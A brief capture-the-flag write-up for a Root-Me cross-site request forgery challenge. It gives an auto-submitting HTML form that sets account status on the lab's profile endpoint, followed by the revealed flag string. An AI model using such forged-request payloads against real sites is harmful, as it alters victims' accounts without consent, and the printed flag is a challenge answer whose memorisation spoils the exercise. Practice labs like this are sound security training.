/ch22/?action=contact
```
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
	<input type="text" name="username" value="user">
	<input type="checkbox" name="status" checked >
	<button type="submit">Submit</button>
</form>

<script>
	document.csrf_form.submit();
</script>
```

/ch22/?action=private
> Good job dude, flag is : Csrf_Fr33style-L3v3l1!
